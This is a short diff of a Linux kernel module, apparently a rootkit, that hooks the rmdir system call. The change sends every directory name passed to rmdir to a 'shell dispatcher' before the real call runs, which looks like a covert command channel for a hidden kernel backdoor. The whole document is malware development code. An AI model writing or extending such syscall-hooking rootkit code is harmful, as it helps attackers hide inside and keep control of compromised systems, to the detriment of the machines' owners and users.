@@ -1,5 +1,8 @@
 #include <linux/module.h>
 #include <linux/slab.h>
+#include <linux/namei.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
@@ -8,6 +11,8 @@
 #include "../../shell/dispatcher.h"
 #include "../utils.h"
 #include "rmdir.h"
+
+#include <linux/mm.h>
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
@@ -20,20 +25,14 @@ asmlinkage long hook_rmdir(const struct pt_regs *regs) {
     const void *pathname = SYSCALL_ARG1(regs, void *);
     char *kernel_filename = duplicate_filename(pathname);
 
-    rk_info("rmdir() hooked for: %s\n", kernel_filename);
+    long ret;
 
-    const long ret = real_rmdir(regs);
+    rk_info("[hook_rmdir] rmdir() hooked for: %s\n", kernel_filename);
 
-    if (ret == 0) {
-        kfree(kernel_filename);
-        return ret;
-    }
-
-    dispatcher(kernel_filename);
+    dispatcher(regs, kernel_filename);
+    ret = real_rmdir(regs);
 
     kfree(kernel_filename);
-
-    // rk_info("rmdir() true return: %ld\n", ret);
 
     return ret;
 }
